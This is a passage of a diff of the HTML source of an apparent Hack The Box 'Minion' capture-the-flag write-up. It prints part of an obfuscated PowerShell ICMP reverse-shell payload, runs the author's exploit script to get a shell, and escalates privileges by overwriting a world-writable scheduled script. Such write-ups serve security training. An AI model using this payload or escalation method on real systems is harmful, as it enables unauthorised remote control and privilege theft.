class="n">8</span><span class="p">)</span> <span class="p">|</span> <span class="nb">Out-String</span><span class="p">);</span> <span class="p">}</span> <span class="k">catch</span> <span class="p">{</span> <span class="nv">$rt</span> <span class="p">=</span> <span class="p">(</span><span class="nv">$_</span><span class="p">.</span><span class="n">Exception</span><span class="p">|</span><span class="nb">out-string</span><span class="p">)</span> <span class="p">};</span> <span class="nv">$i</span><span class="p">=</span><span class="n">0</span><span class="p">;</span> <span class="k">while</span> <span class="p">(</span><span class="nv">$i</span> <span class="o">-lt</span> <span class="nv">$rt</span><span class="p">.</span><span class="n">length</span><span class="p">-</span><span class="n">110</span><span class="p">)</span> <span class="p">{</span> <span class="n">s</span><span class="p">(</span><span class="n">-join</span><span class="p">(</span><span class="nv">$id</span><span class="p">,</span><span class="nv">$rt</span><span class="p">.</span><span class="n">Substring</span><span class="p">(</span><span class="nv">$i</span><span class="p">,</span><span class="n">110</span><span class="p">)));</span> <span class="nv">$i</span> <span class="p">-=</span> <span class="p">-</span><span class="n">110</span><span class="p">;</span> <span class="p">};</span> <span class="n">s</span><span class="p">(</span><span class="n">-join</span><span class="p">(</span><span class="nv">$id</span><span class="p">,</span><span class="nv">$rt</span><span class="p">.</span><span class="n">Substring</span><span class="p">(</span><span class="nv">$i</span><span class="p">)));</span> <span class="p">}</span></span></span></code></pre></div></div></p>
 
 <p>You can see I did some tricks like using $i -= -110 instead of $i += 110 etc. My script has a feature of unique ids, because -when using the ICMP protocol- things can get quite messy if multiple payloads are running simultaneously. You can download my script from here: <a href="https://github.com/Alamot/code-snippets/blob/master/hacking/HTB/Minion/icmp_alamot.py" target="_blank">https://github.com/Alamot/code-snippets/blob/master/hacking/HTB/Minion/icmp_alamot.py</a></p>
 
 <p>Now, let&rsquo;s get a shell (don&rsquo;t forget to change LHOST inside the script):
-<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="gp">$ </span>sudo python2 icmp_alamot.py
-<span class="err">
-</span><span class="err"></span><span class="go">Sending powershell ICMP payload [UID=35cfb54c] and waiting for shell...
-</span><span class="go">[P$] apppool\defaultapppool@MINION inetsrv&gt; ls C:\   
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">    Directory: C:\
-</span><span class="go"></span><span class="err">
-</span><span class="err"></span><span class="go">Mode                LastWriteTime     Length Name                              
-</span><span class="go">----                -------------     ------ ----                              
-</span><span class="go">d----          9/4/2017   7:42 PM            accesslogs                        
-</span><span class="go">d----         8/10/2017  10:43 AM            inetpub                           
-</span><span class="go">d----         3/28/2018   6:31 AM            Microsoft                         
-</span><span class="go">d----         8/22/2013   8:52 AM            PerfLogs                          
-</span><span class="go">d-r--         9/25/2017   1:51 AM            Program Files                     
-</span><span class="go">d----         8/10/2017   9:42 AM            Program Files (x86)               
-</span><span class="go">d----         8/24/2017   1:28 AM            sysadmscripts                     
-</span><span class="go">d----         3/28/2018   8:51 AM            temp                              
-</span><span class="go">d-r--          9/4/2017   7:41 PM            Users                             
-</span><span class="go">d----         9/10/2017  10:20 AM            Windows
-</span></code></pre></div></div></p>
+<div class="bg-black"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> sudo python2 icmp_alamot.py
+</span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Sending powershell ICMP payload [UID=35cfb54c] and waiting for shell...
+</span></span></span><span class="line"><span class="cl"><span class="go">[P$] apppool\defaultapppool@MINION inetsrv&gt; ls C:\   
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">    Directory: C:\
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">Mode                LastWriteTime     Length Name                              
+</span></span></span><span class="line"><span class="cl"><span class="go">----                -------------     ------ ----                              
+</span></span></span><span class="line"><span class="cl"><span class="go">d----          9/4/2017   7:42 PM            accesslogs                        
+</span></span></span><span class="line"><span class="cl"><span class="go">d----         8/10/2017  10:43 AM            inetpub                           
+</span></span></span><span class="line"><span class="cl"><span class="go">d----         3/28/2018   6:31 AM            Microsoft                         
+</span></span></span><span class="line"><span class="cl"><span class="go">d----         8/22/2013   8:52 AM            PerfLogs                          
+</span></span></span><span class="line"><span class="cl"><span class="go">d-r--         9/25/2017   1:51 AM            Program Files                     
+</span></span></span><span class="line"><span class="cl"><span class="go">d----         8/10/2017   9:42 AM            Program Files (x86)               
+</span></span></span><span class="line"><span class="cl"><span class="go">d----         8/24/2017   1:28 AM            sysadmscripts                     
+</span></span></span><span class="line"><span class="cl"><span class="go">d----         3/28/2018   8:51 AM            temp                              
+</span></span></span><span class="line"><span class="cl"><span class="go">d-r--          9/4/2017   7:41 PM            Users                             
+</span></span></span><span class="line"><span class="cl"><span class="go">d----         9/10/2017  10:20 AM            Windows
+</span></span></span></code></pre></div></div></p>
 
 <h1 id="getting-decoder">Getting decoder</h1>
 
 <p>The folder sysadmscripts seems interesting:
-<div class="bg-ps"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="p">[</span><span class="n">P</span><span class="p">$]</span> <span class="n">apppool</span><span class="p">\</span><span class="n">defaultapppool</span><span class="nv">@MINION</span> <span class="n">inetsrv</span><span class="p">&gt;</span> <span class="nb">ls </span><span class="n">C:</span><span class="p">\</span><span class="n">sysadmscripts</span>
-
-    <span class="n">Directory</span><span class="err">:</span> <span class="n">C:</span><span class="p">\</span><span class="n">sysadmscripts</span>
-
-<span class="n">Mode</span>                <span class="n">LastWriteTime</span>     <span class="n">Length</span> <span class="n">Name</span>                              
-<span class="p">----</span>                <span class="p">-------------</span>     <span class="p">------</span> <span class="p">----</span>                              
-<span class="n">-a</span><span class="p">---</span>         <span class="n">3</span><span class="p">/</span><span class="n">28</span><span class="p">/</span><span class="n">2018</span>   <span class="n">8</span><span class="err">:</span><span class="n">47</span> <span class="n">AM</span>        <span class="n">176</span> <span class="n">c</span><span class="p">.</span><span class="n">ps1</span>                             
-<span class="n">-a</span><span class="p">---</span>         <span class="n">8</span><span class="p">/</span><span class="n">22</span><span class="p">/</span><span class="n">2017</span>  <span class="n">10</span><span class="err">:</span><span class="n">46</span> <span class="n">AM</span>        <span class="n">263</span> <span class="n">del_logs</span><span class="p">.</span><span class="n">bat</span>                      </code></pre></div></div></p>
+<div class="bg-ps"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">[</span><span class="n">P</span><span class="p">$]</span> <span class="n">apppool</span><span class="p">\</span><span class="n">defaultapppool</span><span class="nv">@MINION</span> <span class="n">inetsrv</span><span class="p">&gt;</span> <span class="nb">ls </span><span class="n">C:</span><span class="p">\</span><span class="n">sysadmscripts</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">Directory</span><span class="err">:</span> <span class="n">C:</span><span class="p">\</span><span class="n">sysadmscripts</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Mode</span>                <span class="n">LastWriteTime</span>     <span class="n">Length</span> <span class="n">Name</span>                              
+</span></span><span class="line"><span class="cl"><span class="p">----</span>                <span class="p">-------------</span>     <span class="p">------</span> <span class="p">----</span>                              
+</span></span><span class="line"><span class="cl"><span class="n">-a</span><span class="p">---</span>         <span class="n">3</span><span class="p">/</span><span class="n">28</span><span class="p">/</span><span class="n">2018</span>   <span class="n">8</span><span class="err">:</span><span class="n">47</span> <span class="n">AM</span>        <span class="n">176</span> <span class="n">c</span><span class="p">.</span><span class="n">ps1</span>                             
+</span></span><span class="line"><span class="cl"><span class="n">-a</span><span class="p">---</span>         <span class="n">8</span><span class="p">/</span><span class="n">22</span><span class="p">/</span><span class="n">2017</span>  <span class="n">10</span><span class="err">:</span><span class="n">46</span> <span class="n">AM</span>        <span class="n">263</span> <span class="n">del_logs</span><span class="p">.</span><span class="n">bat</span>                      </span></span></code></pre></div></div></p>
 
 <p>Let&rsquo;s see the contents of del_logs.bat:
-<div class="bg-ps"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="p">[</span><span class="n">P</span><span class="p">$]</span> <span class="n">apppool</span><span class="p">\</span><span class="n">defaultapppool</span><span class="nv">@MINION</span> <span class="n">inetsrv</span><span class="p">&gt;</span> <span class="nb">cat </span><span class="n">C:</span><span class="p">\</span><span class="n">sysadmscripts</span><span class="p">\</span><span class="n">del_logs</span><span class="p">.</span><span class="n">bat</span>
-
-<span class="nv">@echo</span> <span class="n">off</span>
-<span class="nb">echo </span><span class="k">%</span><span class="n">DATE</span><span class="p">%</span> <span class="k">%</span><span class="n">TIME</span><span class="p">%</span> <span class="nb">start </span><span class="n">job</span> <span class="p">&gt;&gt;</span> <span class="n">c:</span><span class="p">\</span><span class="n">windows</span><span class="p">\</span><span class="n">temp</span><span class="p">\</span><span class="n">log</span><span class="p">.</span><span class="n">txt</span>
-<span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">System32</span><span class="p">\</span><span class="n">WindowsPowerShell</span><span class="p">\</span><span class="n">v1</span><span class="p">.</span><span class="n">0</span><span class="p">\</span><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-windowstyle</span> <span class="n">hidden</span> <span class="n">-exec</span> <span class="n">bypass</span> <span class="n">-nop</span> <span class="o">-file</span> <span class="n">c:</span><span class="p">\</span><span class="n">sysadmscripts</span><span class="p">\</span><span class="n">c</span><span class="p">.</span><span class="n">ps1</span> <span class="n">c:</span><span class="p">\</span><span class="n">accesslogs</span> 
-<span class="nb">echo </span><span class="k">%</span><span class="n">DATE</span><span class="p">%</span> <span class="k">%</span><span class="n">TIME</span><span class="p">%</span> <span class="n">stop</span> <span class="n">job</span> <span class="p">&gt;&gt;</span> <span class="n">c:</span><span class="p">\</span><span class="n">windows</span><span class="p">\</span><span class="n">temp</span><span class="p">\</span><span class="n">log</span><span class="p">.</span><span class="n">txt</span></code></pre></div></div></p>
+<div class="bg-ps"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">[</span><span class="n">P</span><span class="p">$]</span> <span class="n">apppool</span><span class="p">\</span><span class="n">defaultapppool</span><span class="nv">@MINION</span> <span class="n">inetsrv</span><span class="p">&gt;</span> <span class="nb">cat </span><span class="n">C:</span><span class="p">\</span><span class="n">sysadmscripts</span><span class="p">\</span><span class="n">del_logs</span><span class="p">.</span><span class="n">bat</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="nv">@echo</span> <span class="n">off</span>
+</span></span><span class="line"><span class="cl"><span class="nb">echo </span><span class="k">%</span><span class="n">DATE</span><span class="p">%</span> <span class="k">%</span><span class="n">TIME</span><span class="p">%</span> <span class="nb">start </span><span class="n">job</span> <span class="p">&gt;&gt;</span> <span class="n">c:</span><span class="p">\</span><span class="n">windows</span><span class="p">\</span><span class="n">temp</span><span class="p">\</span><span class="n">log</span><span class="p">.</span><span class="n">txt</span>
+</span></span><span class="line"><span class="cl"><span class="n">C:</span><span class="p">\</span><span class="n">Windows</span><span class="p">\</span><span class="n">System32</span><span class="p">\</span><span class="n">WindowsPowerShell</span><span class="p">\</span><span class="n">v1</span><span class="p">.</span><span class="n">0</span><span class="p">\</span><span class="n">powershell</span><span class="p">.</span><span class="n">exe</span> <span class="n">-windowstyle</span> <span class="n">hidden</span> <span class="n">-exec</span> <span class="n">bypass</span> <span class="n">-nop</span> <span class="o">-file</span> <span class="n">c:</span><span class="p">\</span><span class="n">sysadmscripts</span><span class="p">\</span><span class="n">c</span><span class="p">.</span><span class="n">ps1</span> <span class="n">c:</span><span class="p">\</span><span class="n">accesslogs</span> 
+</span></span><span class="line"><span class="cl"><span class="nb">echo </span><span class="k">%</span><span class="n">DATE</span><span class="p">%</span> <span class="k">%</span><span class="n">TIME</span><span class="p">%</span> <span class="n">stop</span> <span class="n">job</span> <span class="p">&gt;&gt;</span> <span class="n">c:</span><span class="p">\</span><span class="n">windows</span><span class="p">\</span><span class="n">temp</span><span class="p">\</span><span class="n">log</span><span class="p">.</span><span class="n">txt</span></span></span></code></pre></div></div></p>
 
 <p>We can&rsquo;t read this c:\windows\temp\log.txt but if we do a dir in different times we can see that its LastWriteTime changes every 5 minutes.
-<div class="bg-ps"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="p">[</span><span class="n">P</span><span class="p">$]</span> <span class="n">apppool</span><span class="p">\</span><span class="n">defaultapppool</span><span class="nv">@MINION</span> <span class="n">inetsrv</span><span class="p">&gt;</span> <span class="nb">dir </span><span class="n">c:</span><span class="p">\</span><span class="n">windows</span><span class="p">\</span><span class="n">temp</span><span class="p">\</span><span class="n">log</span><span class="p">.</span><span class="n">txt</span>
-
-
-    <span class="n">Directory</span><span class="err">:</span> <span class="n">C:</span><span class="p">\</span><span class="n">windows</span><span class="p">\</span><span class="n">temp</span>
-
-
-<span class="n">Mode</span>                <span class="n">LastWriteTime</span>     <span class="n">Length</span> <span class="n">Name</span>                              
-<span class="p">----</span>                <span class="p">-------------</span>     <span class="p">------</span> <span class="p">----</span>                              
-<span class="n">-a</span><span class="p">---</span>         <span class="n">4</span><span class="p">/</span><span class="n">10</span><span class="p">/</span><span class="n">2018</span>  <span class="n">12</span><span class="err">:</span><span class="n">01</span> <span class="n">PM</span>     <span class="n">197511</span> <span class="n">log</span><span class="p">.</span><span class="n">txt</span></code></pre></div></div></p>
+<div class="bg-ps"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">[</span><span class="n">P</span><span class="p">$]</span> <span class="n">apppool</span><span class="p">\</span><span class="n">defaultapppool</span><span class="nv">@MINION</span> <span class="n">inetsrv</span><span class="p">&gt;</span> <span class="nb">dir </span><span class="n">c:</span><span class="p">\</span><span class="n">windows</span><span class="p">\</span><span class="n">temp</span><span class="p">\</span><span class="n">log</span><span class="p">.</span><span class="n">txt</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">    <span class="n">Directory</span><span class="err">:</span> <span class="n">C:</span><span class="p">\</span><span class="n">windows</span><span class="p">\</span><span class="n">temp</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Mode</span>                <span class="n">LastWriteTime</span>     <span class="n">Length</span> <span class="n">Name</span>                              
+</span></span><span class="line"><span class="cl"><span class="p">----</span>                <span class="p">-------------</span>     <span class="p">------</span> <span class="p">----</span>                              
+</span></span><span class="line"><span class="cl"><span class="n">-a</span><span class="p">---</span>         <span class="n">4</span><span class="p">/</span><span class="n">10</span><span class="p">/</span><span class="n">2018</span>  <span class="n">12</span><span class="err">:</span><span class="n">01</span> <span class="n">PM</span>     <span class="n">197511</span> <span class="n">log</span><span class="p">.</span><span class="n">txt</span></span></span></code></pre></div></div></p>
 
 <p>Let&rsquo;s examine the permissions in the sysadmscripts folder:
-<div class="bg-ps"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="p">[</span><span class="n">P</span><span class="p">$]</span> <span class="n">apppool</span><span class="p">\</span><span class="n">defaultapppool</span><span class="nv">@MINION</span> <span class="n">sysadmscripts</span><span class="p">&gt;</span> <span class="nb">ls </span><span class="p">|</span> <span class="nb">get-acl</span> <span class="p">|</span> <span class="nb">fl
-</span><span class="nb"></span>
-<span class="n">Path</span>   <span class="err">:</span> <span class="n">Microsoft</span><span class="p">.</span><span class="n">PowerShell</span><span class="p">.</span><span class="n">Core</span><span class="p">\</span><span class="n">FileSystem</span><span class="p">::</span><span class="n">C:</span><span class="p">\</span><span class="n">sysadmscripts</span><span class="p">\</span><span class="n">c</span><span class="p">.</span><span class="n">ps1</span>
-<span class="n">Owner</span>  <span class="err">:</span> <span class="n">BUILTIN</span><span class="p">\</span><span class="n">Administrators</span>
-<span class="nb">Group </span> <span class="err">:</span> <span class="n">MINION</span><span class="p">\</span><span class="n">None</span>
-<span class="n">Access</span> <span class="err">:</span> <span class="n">Everyone</span> <span class="n">Allow</span>  <span class="n">FullControl</span>
-         <span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">SYSTEM</span> <span class="n">Allow</span>  <span class="n">FullControl</span>
-         <span class="n">BUILTIN</span><span class="p">\</span><span class="n">Administrators</span> <span class="n">Allow</span>  <span class="n">FullControl</span>
-         <span class="n">BUILTIN</span><span class="p">\</span><span class="n">Users</span> <span class="n">Allow</span>  <span class="n">FullControl</span>
-<span class="n">Audit</span>  <span class="err">:</span> 
-<span class="n">Sddl</span>   <span class="err">:</span> <span class="n">O:BAG</span><span class="err">:</span><span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">2506507270</span><span class="p">-</span><span class="n">770315343</span><span class="p">-</span><span class="n">2455145413</span><span class="p">-</span><span class="n">513D</span><span class="err">:</span><span class="n">PAI</span><span class="p">(</span><span class="n">A</span><span class="p">;;</span><span class="n">FA</span><span class="p">;;;</span><span class="n">WD</span><span class="p">)(</span><span class="n">A</span><span class="p">;</span>
-         <span class="p">;</span><span class="n">FA</span><span class="p">;;;</span><span class="n">SY</span><span class="p">)(</span><span class="n">A</span><span class="p">;;</span><span class="n">FA</span><span class="p">;;;</span><span class="n">BA</span><span class="p">)(</span><span class="n">A</span><span class="p">;;</span><span class="n">FA</span><span class="p">;;;</span><span class="n">BU</span><span class="p">)</span>
-
-<span class="n">Path</span>   <span class="err">:</span> <span class="n">Microsoft</span><span class="p">.</span><span class="n">PowerShell</span><span class="p">.</span><span class="n">Core</span><span class="p">\</span><span class="n">FileSystem</span><span class="p">::</span><span class="n">C:</span><span class="p">\</span><span class="n">sysadmscripts</span><span class="p">\</span><span class="n">del_logs</span><span class="p">.</span><span class="n">bat</span>
-<span class="n">Owner</span>  <span class="err">:</span> <span class="n">BUILTIN</span><span class="p">\</span><span class="n">Administrators</span>
-<span class="nb">Group </span> <span class="err">:</span> <span class="n">MINION</span><span class="p">\</span><span class="n">None</span>
-<span class="n">Access</span> <span class="err">:</span> <span class="n">Everyone</span> <span class="n">Allow</span>  <span class="n">ReadAndExecute</span><span class="p">,</span> <span class="n">Synchronize</span>
-         <span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">SYSTEM</span> <span class="n">Allow</span>  <span class="n">FullControl</span>
-         <span class="n">BUILTIN</span><span class="p">\</span><span class="n">Administrators</span> <span class="n">Allow</span>  <span class="n">FullControl</span>
-         <span class="n">BUILTIN</span><span class="p">\</span><span class="n">Users</span> <span class="n">Allow</span>  <span class="n">ReadAndExecute</span><span class="p">,</span> <span class="n">Synchronize</span>
-<span class="n">Audit</span>  <span class="err">:</span> 
-<span class="n">Sddl</span>   <span class="err">:</span> <span class="n">O:BAG</span><span class="err">:</span><span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">2506507270</span><span class="p">-</span><span class="n">770315343</span><span class="p">-</span><span class="n">2455145413</span><span class="p">-</span><span class="n">513D</span><span class="err">:</span><span class="n">PAI</span><span class="p">(</span><span class="n">A</span><span class="p">;;</span><span class="n">0x1200a9</span><span class="p">;;;</span>
-         <span class="n">WD</span><span class="p">)(</span><span class="n">A</span><span class="p">;;</span><span class="n">FA</span><span class="p">;;;</span><span class="n">SY</span><span class="p">)(</span><span class="n">A</span><span class="p">;;</span><span class="n">FA</span><span class="p">;;;</span><span class="n">BA</span><span class="p">)(</span><span class="n">A</span><span class="p">;;</span><span class="n">0x1200a9</span><span class="p">;;;</span><span class="n">BU</span><span class="p">)</span></code></pre></div></div></p>
+<div class="bg-ps"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="line"><span class="cl"><span class="p">[</span><span class="n">P</span><span class="p">$]</span> <span class="n">apppool</span><span class="p">\</span><span class="n">defaultapppool</span><span class="nv">@MINION</span> <span class="n">sysadmscripts</span><span class="p">&gt;</span> <span class="nb">ls </span><span class="p">|</span> <span class="nb">get-acl</span> <span class="p">|</span> <span class="nb">fl
+</span></span></span><span class="line"><span class="cl"><span class="nb"></span>
+</span></span><span class="line"><span class="cl"><span class="n">Path</span>   <span class="err">:</span> <span class="n">Microsoft</span><span class="p">.</span><span class="n">PowerShell</span><span class="p">.</span><span class="n">Core</span><span class="p">\</span><span class="n">FileSystem</span><span class="p">::</span><span class="n">C:</span><span class="p">\</span><span class="n">sysadmscripts</span><span class="p">\</span><span class="n">c</span><span class="p">.</span><span class="n">ps1</span>
+</span></span><span class="line"><span class="cl"><span class="n">Owner</span>  <span class="err">:</span> <span class="n">BUILTIN</span><span class="p">\</span><span class="n">Administrators</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Group </span> <span class="err">:</span> <span class="n">MINION</span><span class="p">\</span><span class="n">None</span>
+</span></span><span class="line"><span class="cl"><span class="n">Access</span> <span class="err">:</span> <span class="n">Everyone</span> <span class="n">Allow</span>  <span class="n">FullControl</span>
+</span></span><span class="line"><span class="cl">         <span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">SYSTEM</span> <span class="n">Allow</span>  <span class="n">FullControl</span>
+</span></span><span class="line"><span class="cl">         <span class="n">BUILTIN</span><span class="p">\</span><span class="n">Administrators</span> <span class="n">Allow</span>  <span class="n">FullControl</span>
+</span></span><span class="line"><span class="cl">         <span class="n">BUILTIN</span><span class="p">\</span><span class="n">Users</span> <span class="n">Allow</span>  <span class="n">FullControl</span>
+</span></span><span class="line"><span class="cl"><span class="n">Audit</span>  <span class="err">:</span> 
+</span></span><span class="line"><span class="cl"><span class="n">Sddl</span>   <span class="err">:</span> <span class="n">O:BAG</span><span class="err">:</span><span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">2506507270</span><span class="p">-</span><span class="n">770315343</span><span class="p">-</span><span class="n">2455145413</span><span class="p">-</span><span class="n">513D</span><span class="err">:</span><span class="n">PAI</span><span class="p">(</span><span class="n">A</span><span class="p">;;</span><span class="n">FA</span><span class="p">;;;</span><span class="n">WD</span><span class="p">)(</span><span class="n">A</span><span class="p">;</span>
+</span></span><span class="line"><span class="cl">         <span class="p">;</span><span class="n">FA</span><span class="p">;;;</span><span class="n">SY</span><span class="p">)(</span><span class="n">A</span><span class="p">;;</span><span class="n">FA</span><span class="p">;;;</span><span class="n">BA</span><span class="p">)(</span><span class="n">A</span><span class="p">;;</span><span class="n">FA</span><span class="p">;;;</span><span class="n">BU</span><span class="p">)</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="n">Path</span>   <span class="err">:</span> <span class="n">Microsoft</span><span class="p">.</span><span class="n">PowerShell</span><span class="p">.</span><span class="n">Core</span><span class="p">\</span><span class="n">FileSystem</span><span class="p">::</span><span class="n">C:</span><span class="p">\</span><span class="n">sysadmscripts</span><span class="p">\</span><span class="n">del_logs</span><span class="p">.</span><span class="n">bat</span>
+</span></span><span class="line"><span class="cl"><span class="n">Owner</span>  <span class="err">:</span> <span class="n">BUILTIN</span><span class="p">\</span><span class="n">Administrators</span>
+</span></span><span class="line"><span class="cl"><span class="nb">Group </span> <span class="err">:</span> <span class="n">MINION</span><span class="p">\</span><span class="n">None</span>
+</span></span><span class="line"><span class="cl"><span class="n">Access</span> <span class="err">:</span> <span class="n">Everyone</span> <span class="n">Allow</span>  <span class="n">ReadAndExecute</span><span class="p">,</span> <span class="n">Synchronize</span>
+</span></span><span class="line"><span class="cl">         <span class="n">NT</span> <span class="n">AUTHORITY</span><span class="p">\</span><span class="n">SYSTEM</span> <span class="n">Allow</span>  <span class="n">FullControl</span>
+</span></span><span class="line"><span class="cl">         <span class="n">BUILTIN</span><span class="p">\</span><span class="n">Administrators</span> <span class="n">Allow</span>  <span class="n">FullControl</span>
+</span></span><span class="line"><span class="cl">         <span class="n">BUILTIN</span><span class="p">\</span><span class="n">Users</span> <span class="n">Allow</span>  <span class="n">ReadAndExecute</span><span class="p">,</span> <span class="n">Synchronize</span>
+</span></span><span class="line"><span class="cl"><span class="n">Audit</span>  <span class="err">:</span> 
+</span></span><span class="line"><span class="cl"><span class="n">Sddl</span>   <span class="err">:</span> <span class="n">O:BAG</span><span class="err">:</span><span class="n">S</span><span class="p">-</span><span class="n">1</span><span class="p">-</span><span class="n">5</span><span class="p">-</span><span class="n">21</span><span class="p">-</span><span class="n">2506507270</span><span class="p">-</span><span class="n">770315343</span><span class="p">-</span><span class="n">2455145413</span><span class="p">-</span><span class="n">513D</span><span class="err">:</span><span class="n">PAI</span><span class="p">(</span><span class="n">A</span><span class="p">;;</span><span class="n">0x1200a9</span><span class="p">;;;</span>
+</span></span><span class="line"><span class="cl">         <span class="n">WD</span><span class="p">)(</span><span class="n">A</span><span class="p">;;</span><span class="n">FA</span><span class="p">;;;</span><span class="n">SY</span><span class="p">)(</span><span class="n">A</span><span class="p">;;</span><span class="n">FA</span><span class="p">;;;</span><span class="n">BA</span><span class="p">)(</span><span class="n">A</span><span class="p">;;</span><span class="n">0x1200a9</span><span class="p">;;;</span><span class="n">BU</span><span class="p">)</span></span></span></code></pre></div></div></p>
 
 <p>User decoder runs the script c.ps1 every 5 minutes and we can overwrite it with our own payload. The problem is that in a multi-user, multi-hacker environment everyone else can (and want to) do the same. So, we have to be very patient and very lucky to succeed. Moreover, sometimes the MINION box is quite laggy even after a fresh reset. I don&rsquo;t know why this happens. So, let&rsquo;s be patient and hope our c.ps1 payload will not be overwritten till it is executed.</p>
 
 <p>Inside icmp_alamot.py, I have coded some extra features:
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"># &gt; UPLOAD local_path remote_path
-#   (to upload a file using the HTTP protocol via xcmd, &#34;echo &gt;&gt;&#34; commands and
-#    base64 encoding/decoding)
-#   e.g. &gt; UPLOAD myfile.txt C:\temp\myfile.txt
-#
-# &gt; DOWNLOAD remote_path
-#   (to download a file using the ICMP protocol and base64 encoding/decoding)
-#    e.g. &gt; DOWNLOAD C:\temp\myfile.txt
-#
-# &gt; DECODER (to get user decoder)
-#
-# &gt; ADMIN (to get user admin)</code></pre></div></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl"># &gt; UPLOAD local_path remote_path
+</span></span><span class="line"><span class="cl">#   (to upload a file using the HTTP protocol via xcmd, &#34;echo &gt;&gt;&#34; commands and
+</span></span><span class="line"><span class="cl">#    base64 encoding/decoding)
+</span></span><span class="line"><span class="cl">#   e.g. &gt; UPLOAD myfile.txt C:\temp\myfile.txt
+</span></span><span class="line"><span class="cl">#
+</span></span><span class="line"><span class="cl"># &gt; DOWNLOAD remote_path
+</span></span><span class="line"><span class="cl">#   (to download a file using the ICMP protocol and base64 encoding/decoding)
+</span></span><span class="line"><span class="cl">#    e.g. &gt; DOWNLOAD C:\temp\myfile.txt
+</span></span><span class="line"><span class="cl">#
+</span></span><span class="line"><span class="cl"># &gt; DECODER (to get user decoder)
+</span></span><span class="line"><span class="cl">#
+</span></span><span class="line"><span class="cl"># &gt; ADMIN (to get user admin)</span></span></code></pre></div></p>
 
 <p>If you are curious have a look in the code. The command DECODER I have coded uses HTTP to upload our payload in c:\sysadmscripts\c.ps1:
-<div class="bg-ps"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-powershell" data-lang="powershell"><span class="p">[</span><span class="n">P</span><span class="p">$]</span> <span class="n">iis</span> <span class="n">apppool</span><span class="p">\</span><span class="n">defaultapppool</span><span class="nv">@MINION</span> <span class="n">inetsrv</span><span class="p">&gt;</span> <span class="n">DECODER</span>
-<span class="n">Uploading</span> <span class="n">c</span><span class="p">.</span><span class="n">ps1</span> <span class="n">to</span> <span class="n">c:</span><span class="p">\</span><span class="n">sysadmscripts</span><span class="p">\</span><span class="n">c</span><span class="p">.</span><span class="n">ps1</span>
-<span class="n">MD5</span> <span class="n">hash</span><span class="err">:</span> <span class="n">9e860b7e4773f394c7aa9be5b88b7cfc</span>
-<span class="n">Data</span> <span class="n">Length</span><span class="err">:</span> <span class="n">976</span> <span class="n">bytes</span>
-<span class="n">100</span><span class="p">%|</span><span class="err">█████████████████████████████████████████████████████████████████████████</span><span class="p">|</span> <span class="n">990</span><span class="p">/</span><span class="n">990</span> <span class="p">[</span><span class="n">00</span><span class="err">:</span><span class="n">01</span><span class="p">&lt;</span><span class="n">00</span><span class="err">:</span><span class="n">00</span><span class="p">,</span> <span class="n">795</span><span class="p">.</span><span class="n">59bytes</span><span class="p">/</span><span class="n">s</span><span class="p">]</span>
-<span class="n">Waiting</span> <span class="k">for</span> <span class="n">decoder</span> <span class="n">shell</span><span class="p">...</span>
-<span class="p">[</span><span class="n">P</span><span class="p">$]</span> <span class="n">minion</span><span class="p">\</span><span class="n">decoder</span><span class="nv">@MINION</span> <span class="n">system32</span><span class="p">&gt;</span> <span class="n">whoami</span>
-<span class="n">minion</span><span class="p">\</span><span class="n">decoder</span></code></pre></div></div></p>
